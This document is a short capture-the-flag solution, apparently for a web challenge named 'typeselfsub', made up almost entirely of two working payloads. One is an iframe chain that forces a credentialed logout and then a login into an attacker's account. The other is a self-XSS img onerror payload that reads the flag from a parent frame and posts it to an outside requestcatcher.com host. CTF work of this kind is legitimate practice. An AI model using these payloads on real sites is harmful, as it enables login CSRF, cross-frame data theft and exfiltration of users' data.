Cross-Frame Scripting
```
<iframe id="iframe01" name="iframe01" src="https://typeselfsub.web.ctfcompetition.com/flag" sandbox="allow-same-origin allow-scripts" onload="console.log('loaded');var xhr = new XMLHttpRequest();xhr.open('POST','https://typeselfsub.web.ctfcompetition.com/logout',true);xhr.withCredentials=true;console.log('Logging out');xhr.onerror=function(){console.log('Logged out.logging in');var xhr2=new XMLHttpRequest();xhr2.open('POST','https://typeselfsub.web.ctfcompetition.com/login',true);xhr2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr2.withCredentials=true;xhr2.onerror=function(){console.log('Logged in');var iframe=document.createElement('iframe');iframe.style.display='none';iframe.src='https://typeselfsub.web.ctfcompetition.com/me';iframe.sandbox='allow-same-origin allow-scripts';document.body.appendChild(iframe);};xhr2.send('username=asd23dfasd%26password=asd23dfasdasd23dfasdasd23dfasd');};xhr.send(null);"></iframe>
```

Self-XSS (/me)
```
<img src=x onerror="fetch('https://234fasd523dfasdfasdf.requestcatcher.com/Z?d=',{method:'POST',body:btoa(parent.frames['iframe01'].document.getElementById('flag').innerText)});">
```
